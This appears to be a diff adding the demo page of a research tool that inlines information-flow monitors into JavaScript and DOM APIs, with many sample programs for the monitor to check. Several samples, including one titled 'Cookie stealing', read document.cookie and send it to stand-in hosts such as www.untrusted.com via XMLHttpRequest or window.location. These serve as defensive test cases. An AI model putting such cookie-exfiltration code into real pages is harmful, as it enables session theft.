@@ -1,0 +1,648 @@
+<html>
+
+   <head>
+      <title>Information Flow Monitor Inlining for JavaScript and Web APIs</title>
+
+		<link rel="stylesheet" href="srcs/styles/libs/qunit-git.css" />
+        <link rel="stylesheet" href="srcs/styles/page/main.css" />
+        
+        <script>
+         var _runtime = {};  
+        </script>
+		<script src="srcs/js/libs/jquery-1.9.0.min.js"></script>
+		<script src="srcs/js/libs/jquery.validate.min.js"></script>
+		<script src="srcs/js/libs/esprima.js"></script>
+		<script src="srcs/js/libs/escodegen.js"></script>
+		<script src="srcs/js/comp/utils.js"></script>
+		<script src="srcs/js/comp/comp.js"></script>
+		<script src="srcs/js/comp/comp_identifiers.js"></script>
+		<script src="srcs/js/comp/comp_utils.js"></script>
+		<script src="srcs/js/comp/normalizer.js"></script>
+	    <script src="srcs/js/comp/utils.js"></script>
+        <script src="srcs/js/runtimes/lattice.js"></script>
+        <script src="srcs/js/runtimes/comp-runtimes.js"></script>
+        <script src="srcs/js/runtimes/iflow_signatures.js"></script>
+        <script src="srcs/js/runtimes/dom_iflow_signatures.js"></script>
+		<!--  <script src="srcs/js/tests/test.js"></script> -->  
+		<script src="srcs/js/page/main.js"></script>
+	</head>
+	<body>
+		<h1>Infomation Flow Monitor Inlining for JavaScript and Web APIs</h1>
+		<div id="main">
+		    <a href="../instrumentation.pdf">Information Flow Monitor Inlining Compiler + Proofs</a><br /> 
+		    <a href="../coreDom.pdf">Information Flow Monitor for the DOM API</a><br /> 
+		    
+		    
+		    <a href="dom_iflow_signatures.js">IFlow Signatures for DOM APIs</a><br /> 
+            <a href="iflow_signatures.js">Extra IFlow Signatures</a><br /> 
+            <a href="ifJS.zip">Source Code</a><br /> 
+            <a href="instructions.txt">Instructions on how to use the tool</a><br /> 
+			<h2>Input:</h2>
+			<textarea id="prog_input">//Enter here your JavaScript input program. If the program is not normalized, it must be normalized before being compiled.  All examples in the menu are already normalized. (Normalization is formally defined in the full version of the paper.)
+            </textarea>
+			<br />
+			<button id="rand_btn">Randomize</button>
+			<button id="compile_btn">Compile</button>
+			<button id="add_btn">Save</button>
+            <button id="normalize_btn">Normalize</button>
+            <button id="load_ifsig">LOAD IFLOW_SIG</button>
+            <br />
+            Support Coercions: <input type="checkbox" id="coercions_cb" checked/>
+            Support APIs:<input type="checkbox" id="apis_cb" checked/> 
+            Support Eval:<input type="checkbox" id="eval_cb"/>
+			<br />
+			<br />
+			<h2>Output:</h2>
+			<textarea id="prog_output">//Output Program: if the program triggers an information flow, its execution is blocked and the background becomes red </textarea>
+			<br /> 
+			<button id="run_btn">Run</button>
+			<br />
+			<br /> 
+			<h2>Exec IFrame</h2>
+			<iframe id="exec_iframe" src="exec_iframe.html">Exec IFrame</iframe>	
+			<h3>Specify the CSS StyleSheet to Use with your Example:</h3>
+			<textarea id="css_input"> </textarea>
+			<br />
+			<button id="load_css_btn">Load StyleSheet</button>
+			
+			
+			
+			
+		</div>
+		<div id="examples">
+		<h2> Examples:</h2>
+			<ul>
+			<li id="ex_dom_append_illegal_title">DOM Illegal Append - 1</li>
+			<li id="ex_dom_append_with_upgrade_title">DOM Append with Upgrade - 1</li>
+			<li id="ex_dom_append_with_upgrade_2_title">DOM Append with Upgrade - 2</li>
+			<li id="ex_dom_append_illegal_2_title">DOM Illegal Append - 2</li>
+			<li id="ex_dom_remove_illegal_title">DOM Illegal Remove - 1</li>
+			<li id="ex_paper_example_5_illegal_title">DOM Illegal Remove - 2</li>
+			<li id="ex_paper_example_5_legal_title">DOM Remove with Upgrade - 1</li>	
+			<li id="ex_paper_example_6_illegal_title">DOM Illegal Append - 3</li>
+			<li id="ex_paper_example_6_legal_title">DOM Append with Upgrade - 3</li>
+			<li id="ex_dom_lives_illegal_append_1_title">Live Collections - Illegal Append - 1</li>
+			<li id="ex_dom_lives_illegal_append_2_title">Live Collections - Illegal Append - 2</li>
+			<li id="ex_paper_example_8_illegal_title">Live Collections - Illegal Append - 3</li>
+			<li id="ex_paper_example_8_legal_title">Live Collections - Append with Upgrade - 1</li>	
+			<li id="ex_paper_example_9_illegal_title">Live Collections - Illegal Append - 4</li>
+			<li id="ex_paper_example_9_legal_title">Live Collections - Append with Upgrade - 2</li>
+			<li id="ex1">Simple explicit flow</li>
+			<li id="ex2">Simple implicit flow </li>
+			<li id="ex3">Property upgrade</li>
+			<li id="ex4">Implicit flow</li>
+			<li id="dyn">Dynamic property creation</li>
+			<li id="struct">Structure upgrade</li>
+			<li id="ex5">Eval</li>
+			<li id="ex6">Implicit flow with eval</li>
+			<li id="ex9">XMLHTTPRequest flow</li>
+			<li id="ex10">XMLHTTPRequest flow</li>
+			<li id="ex11">XMLHTTPRequest flow</li>
+			<li id="ex13">alert</li>
+			<li id="ex14_1">confirm and toString</li>
+			<li id="ex14_2">confirm and toString</li>
+			<li id="ex14_3">confirm and toString</li>
+			<li id="ex15">Tampering with native functions</li>
+			<li id="ex15b">Useless tampering with native functions</li>
+			<li id="ex16">New object</li>
+			<li id="ex17">Implicit flow</li>
+			<li id="ex18">Prototype lookup</li>
+			<li id="ex21">Function call</li>
+			<li id="ex22">Implicit flow</li>
+			<li id="aliasing">Aliasing</li>
+			<li id="ex23">Cookie stealing</li>
+			<li id="ex24">Coercions are handled</li>
+			<li id="ex25">For in: Safe</li>
+			<li id="ex26">For in: Safe</li>
+			<li id="ex27">For in: Reject</li>
+			</ul>
+		</div>
+		
+	<div id="examples_code">
+	
+		 <span id="ex_dom_append_illegal">
+			var div1, div2, div3, h, l; 
+            h = 1; 
+            upgVar(h, '2'); 
+            div1 = document.createElement('div');
+            div2 = document.createElement('div');
+            div3 = document.createElement('div');
+            div1.appendChild(div2);
+            if (h) {
+               div3.appendChild(div2);
+            }
+            l = div1.childNodes.length;
+			</span>	
+			
+			<span id="ex_dom_append_upgrade">
+			var div1, div2, div3, h, l; 
+            h = 1; 
+            upgVar(h, '2'); 
+            div1 = document.createElement('div');
+            div2 = document.createElement('div');
+            div3 = document.createElement('div');
+            div1.appendChild(div2);
+            upgStruct(div1, '2'); 
+            upgStruct(div3, '2'); 
+            div2.upgTreeLevel('2');
+            if (h) {
+               div3.appendChild(div2);
+            }
+            l = div1.childNodes.length;
+			</span>	
+			
+			<span id="ex_dom_append_upgrade_2">
+			var div1, div2, div3, h, l; 
+            h = 1; 
+            upgVar(h, '2'); 
+            div1 = document.createElement('div');
+            div2 = document.createElement('div');
+            div3 = document.createElement('div');
+            div1.appendChild(div2);
+            upgStruct(div1, '2'); 
+            upgStruct(div3, '2'); 
+            div2.upgTreeLevel('2');
+            if (h) {
+               div3.appendChild(div2);
+            }
+            l = div1.childNodes.length;
+            alert(l); 
+			</span>	
+
+            <span id="ex_dom_append_illegal_2"> var div1, div2, div3, h, l;
+				h = 1;
+				upgVar(h, '2');
+				div1 = document.createElement("div");
+				div2 = document.createElement("div");
+				div3 = document.createElement("div");
+				div3.appendChild(div2);
+				if (h) {
+				div1.appendChild(div2);
+				}
+				div1.appendChild(div3);
+				l = div1.childNodes[0]; </span>	
+		
+		    <span id="ex_dom_remove_illegal"> var div1, div2, div3, h, l;
+				h = 1;
+				upgVar(h, '2');
+				div1 = document.createElement("div");
+				div2 = document.createElement("div");
+				div1.appendChild(div2);
+				if (h) {
+				div1.removeChild(div2);
+				}
+				l = div1.childNodes[0]; </span>
+					
+			<span id="ex_paper_example_illegal_5"> var div1, div2, h, l;
+				h = confirm("Do you want to execute the if-then branch?");
+				div1 = document.createElement("DIV");
+				div2 = document.createElement("DIV");
+				div1.appendChild(div2);
+				if (h) {
+				div1.removeChild(div2);
+				}
+				l = div1.childNodes.length;
+				alert(l); </span>
+				
+	      	<span id="ex_paper_example_legal_5"> var div1, div2, h, l;
+				h = confirm('Do you want to execute the if-then branch?');
+				div1 = document.createElement('DIV');
+				div2 = document.createElement('DIV');
+				div1.appendChild(div2);
+				upgStruct(div1, '5');
+				div2.upgTreeLevel('5');
+				if (h) {
+				div1.removeChild(div2);
+				}
+				l = div1.childNodes.length; </span>
+
+            <span id="ex_paper_example_illegal_6"> var div1, div2, div3, h, l;
+				h = confirm("Do you want to execute the if-then branch?");
+				div1 = document.createElement("DIV");
+				div2 = document.createElement("DIV");
+				div3 = document.createElement("DIV");
+				div3.appendChild(div2);
+				if (h) {
+				div1.appendChild(div2);
+				}
+				div1.appendChild(div3);
+				l = div1.childNodes[0];
+				alert(l); </span>
+			
+			<span id="ex_paper_example_legal_6"> var div1, div2, div3, h, l;
+				h = confirm('Do you want to execute the if-then branch?');
+				div1 = document.createElement('DIV');
+				div2 = document.createElement('DIV');
+				div3 = document.createElement('DIV');
+				div3.appendChild(div2);
+				upgStruct(div1, '5');
+				upgStruct(div3, '5');
+				div2.upgTreeLevel('5');
+				if (h) {
+				div1.appendChild(div2);
+				}
+				div1.appendChild(div3);
+				l = div1.childNodes[0]; </span>
+			
+			<span id="ex_dom_lives_illegal_append_1"> var div1, div2, div3, divs, h, l;
+				h = 1;
+				upgVar(h, '2');
+				div1 = document.createElement("DIV");
+				div2 = document.createElement("DIV");
+				div3 = document.createElement("DIV");
+				div2.appendChild(div3);
+				document.body.appendChild(div1);
+				document.body.appendChild(div2);
+				divs = document.getElementsByTagName("DIV");
+				if (h) {
+				div2.appendChild(div1);
+				}
+				l = divs[0]; </span>
+				
+			<span id="ex_dom_lives_illegal_append_2"> var div1, div2, div3, divs, h, l;
+				h = 1;
+				upgVar(h, '2');
+				div1 = document.createElement("DIV");
+				div2 = document.createElement("DIV");
+				div3 = document.createElement("DIV");
+				div2.appendChild(div3);
+				document.body.appendChild(div1);
+				document.body.appendChild(div2);
+				divs = document.getElementsByTagName("DIV");
+				upgStruct(div1, '2');
+				upgStruct(div2, '2');
+				upgStruct(document.body, '2');
+				div2.upgTreeLevel('2');
+				div1.upgTreeLevel('2');
+				if (h) {
+				div2.appendChild(div1);
+				}
+				l = divs[1]; </span>
+			
+           	<span id="ex_paper_example_illegal_8"> var div, divs, h, l;
+				h = confirm("Do you want to execute the if-then branch?");
+				divs = document.getElementsByTagName("DIV"); 
+				if (h) {
+				div = document.createElement("DIV");
+				document.body.appendChild(div);
+				}
+				l = divs.length;
+				alert(l); </span>
+				
+            <span id="ex_paper_example_legal_8"> var body, div, divs, h, l;
+				h = confirm('Do you want to execute the if-then branch?');
+				body = document.body;
+				divs = document.getElementsByTagName('DIV');
+				upgStruct(body, '5');
+				upgGlobalTagLevel('DIV', '5');
+				upgVar(div, '5');
+				if (h) {
+				div = document.createElement('DIV');
+				document.body.appendChild(div);
+				}
+				l = divs.length; </span>
+            
+            <span id="ex_paper_example_illegal_9"> var div1, div2, div3, divs, h, l;
+				h = confirm("Do you want to execute the if-then branch?");
+				div1 = document.createElement("DIV");
+				div2 = document.createElement("DIV");
+				document.body.appendChild(div1);
+				document.body.appendChild(div2);
+				divs = document.getElementsByTagName("DIV");
+				if (h) {
+				div3 = document.createElement("DIV");
+				div1.appendChild(div3);
+				}
+				l = divs[1]; </span>
+				
+		    <span id="ex_paper_example_legal_9"> var div1, div2, div3, divs, h, l, body;
+				body = document.body;
+				h = confirm('Do you want to execute the if-then branch?');
+				div1 = document.createElement('DIV');
+				div2 = document.createElement('DIV');
+				body.appendChild(div1);
+				body.appendChild(div2);
+				divs = document.getElementsByTagName('DIV');
+				upgStruct(body, '5');
+				upgStruct(div1, '5');
+				upgGlobalTagLevel('DIV', '5');
+				upgVar(div3, '5');
+				div2.upgTreeLevel('5');
+				if (h) {
+				div3 = document.createElement('DIV');
+				div1.appendChild(div3);
+				}
+				l = divs[1]; </span>
+	
+			<span id="ex1_code"> var x, y;
+				x = 4;
+				upgVar(x, '2');
+				y = x + 4; </span>
+
+			<span id="ex2_code"> var x, y;
+				y = 3;
+				upgVar(y, '2');
+				if (y) {
+				x = 2;
+				} </span>
+
+			<span id="ex3_code"> var x, y, z;
+				y = 3;
+				upgVar(y, '2');
+				z = {};
+				z['p'] = null;
+				upgProp(z, 'p', '2');
+				if (y) {
+				z['p'] = 2;
+				} </span>
+
+			<span id="ex4_code"> var x, y, z;
+				y = 3;
+				upgVar(y, '2');
+				z = {};
+				z['p'] = null;
+				if (y) {
+				z['p'] = 2;
+				} </span>
+			<span id="dyn_code"> var o, h;
+				o = {};
+				h = 3;
+				upgVar(h, '2');
+				if(h) {
+				o['p'] = 2;
+				} </span>
+
+			<span id="struct_code"> var o, h;
+				o = {};
+				h = 3;
+				upgVar(h, '2');
+				upgStruct(o, '2');
+				if(h) {
+				o['p'] = 2;
+				} </span>
+
+			<span id="ex5_code"> var x;
+				eval('x = 3; x') </span>
+
+			<span id="ex6_code"> var x, y;
+				x = 0;
+				y = 2;
+				upgVar(y, '2');
+				if (y) {
+				eval('x = 3; x');
+				} </span>
+
+			<span id="ex9_code"> var xhr, cookie, url;
+				var xhr, cookie, url;
+				document.cookie = '';
+				upgProp(document, 'cookie', '2');
+				xhr = new XMLHttpRequest();
+				cookie = document.cookie;
+				url = 'www.unsafe.com?' + cookie;
+				xhr.open('POST', cookie);
+				xhr.send(); </span>
+
+			<span id="ex10_code"> var xhr, cookie, url;
+				xhr = new XMLHttpRequest();
+				cookie = document.cookie;
+				url = 'www.unsafe.com?' + cookie;
+				xhr.open('POST', cookie);
+				xhr.send(); </span>
+
+			<span id="ex11_code"> var xhr, cookie, url;
+				document.cookie = 'hello';
+				upgProp(document, 'cookie', '2');
+				xhr = new XMLHttpRequest();
+				cookie = document.cookie;
+				url = 'www.safe.com?' + cookie;
+				xhr.open('POST', cookie);
+				xhr.send();</span>
+
+			<span id="ex13_code"> var n, o;
+				n = 10;
+				o = {};
+				while(n) {
+				o[n] = n;
+				n = n - 1;
+				alert(n);
+				} </span>
+
+			<span id="ex14_1_code"> var o1, o2, public1, public2, secret, tmp;
+				o1 = {};
+				o2 = {};
+				secret = confirm('Do you have a secret?');
+				tmp = function () {
+				return 'p';
+				};
+				o1.toString = tmp;
+				o2.p = secret;
+				public1 = o2[o1];
+				if (public1) {
+				public2 = 3;
+				} </span>
+
+			<span id="ex14_2_code"> var o1, o2, public1, public2, secret, f;
+				o1 = {};
+				o2 = {};
+				secret = confirm('Do you have a secret?');
+				f = function () {
+				return 'p';
+				};
+				o1.toString = f;
+				o2.p = secret;
+				public1 = o2[o1.toString()];
+				upgVar(public2, '5');
+				if (public1) {
+				public2 = 3;
+				} </span>
+
+			<span id="ex14_3_code"> var o, f, h;
+				o = {};
+				o.p = 0;
+				upgStruct(o, '2');
+				f = function () {
+				return false;
+				};
+				o.hasOwnProperty = f;
+				h = 1;
+				upgVar(h, '2');
+				if (h) {
+				o.p = 1;
+				} </span>
+
+			<span id="ex15_code"> var o, f_aux, h;
+				var o, f, h;
+				o = {};
+				upgStruct(o, '2');
+				f = function () {
+				return false;
+				};
+				o.hasOwnProperty = f;
+				h = 1;
+				upgVar(h, '2');
+				if (h) {
+				o.p = 1;
+				}</span>
+
+			<span id="ex15b_code"> var o, f_aux, h;
+				o = {};
+				upgStruct(o, '2');
+				f_aux = function () {
+				return false;
+				};
+				o['hasOwnProperty'] = f_aux;
+				h = 1;
+				upgVar(h, '2');
+				if (h) {
+				o['p'] = 1;
+				} </span>
+
+			<span id="ex16_code"> var Person, p1, low;
+				Person = function (id, name, age) {
+				this.id = id;
+				this.name = name;
+				this.age = age;
+				upgProp(this, 'id', '2');
+				};
+				p1 = new Person(1, 'Raquel', 22);
+				low = p1.id; </span>
+           
+            <span id="ex17_code"> var Person, p1, high, low, high;
+				Person = function (id, name, age) {
+				this.id = id;
+				this.name = name;
+				this.age = age;
+				upgProp(this, 'id', '2');
+				};
+				p1 = new Person(1, 'Raquel', 22);
+				high = p1.id;
+				if (high) {
+				low = high + 4;
+				}</span>
+               
+            <span id="ex18_code"> var Person, person_proto, low, high, p1;
+				Person = function (id, name, age) {
+				this.id = id;
+				this.name = name;
+				this.age = age;
+				upgProp(this, 'id', '2');
+				};
+				person_proto = Person.prototype;
+				person_proto.secret = 'secret';
+				upgProp(person_proto, 'secret', '2');
+				p1 = new Person(1, 'Raquel', 22);
+				high = p1.secret;
+				if (high) {
+				low = high + ' other secret';
+				}</span>
+
+			<span id="ex21_code"> var Person, person_proto, fun_say_id, new_person, high;
+				Person = function (name, id) {
+				this.name = name;
+				this.id = id;
+				upgProp(this, 'id', '2');
+				};
+				person_proto = Person.prototype;
+				fun_say_id = function () {
+				return this.id;
+				};
+				person_proto.sayYourId = fun_say_id;
+				new_person = new Person('raquel', 1);
+				high = new_person.sayYourId(); </span>
+
+			<span id="ex22_code"> var Person, person_proto, fun_say_id, new_person, high, low;
+				Person = function (name, id) {
+				this.name = name;
+				this.id = id;
+				upgProp(this, 'id', '2');
+				};
+				person_proto = Person.prototype;
+				fun_say_id = function () {
+				return this.id;
+				};
+				person_proto.sayYourId = fun_say_id;
+				new_person = new Person('raquel', 1);
+				high = new_person.sayYourId();
+				if (high) {
+				low = high * 2;
+				} </span>
+				
+			<span id="aliasing_code"> var x, y, h, z1, z2;
+				h = 0;
+				upgVar(h, '2');
+				x = {};
+				x.f = 0;
+				y = x;
+				y.f = h;
+				z1 = y.f;
+				alert(z1);
+				z2 = x.f;
+				alert(z2); </span>
+
+			<span id="ex23_code"> var cookie, url;
+				document.cookie = '';
+				upgProp(document, 'cookie', '2');
+				cookie = document.cookie;
+				url = 'http://www.untrusted.com/' + cookie;
+				window.location = url; </span>
+
+			<span id="ex24_code"> var h, l, o, aux;
+				h = 1;
+				l = false;
+				o = {};
+				aux = function(){
+				var aux;
+				if(h) {
+				aux = {};
+				return aux;
+				} else {
+				return 1;
+				}
+				}
+				o['valueOf'] = aux;
+				aux = function(){
+				l = true;
+				return 5;
+				}
+				o['toString'] = aux;
+				o+1; </span>
+
+			<span id="ex25_code"> var l, p, o;
+				o = {};
+				o.q = 'foo';
+				o.p = 'bar';
+				l = '';
+				upgProp(o, 'p', '2');
+				for (p in o) {
+				l = l + p;
+				}
+				alert(l); </span>
+
+			<span id="ex26_code"> var l, p, o;
+				o = {};
+				o.q = 'foo';
+				o.p = 'bar';
+				l = '';
+				upgProp(o, 'p', '2');
+				for (p in o) {
+				l = l + p;
+				} </span>
+
+			<span id="ex27_code">var l, p, o, s;
+				o = {};
+				o.q = 'foo';
+				o.p = 'bar';
+				l = '';
+				upgProp(o, 'p', '2');
+				for (p in o) {
+				s = o.p;
+				alert(s);
+				}</span>
+
+		</div>
+		<!--
+		<div id="qunit"></div>
+		<div id="qunit-fixture"></div>
+		<script src="srcs/js/libs/qunit-git.js"></script> -->
+	</body>
+</html>
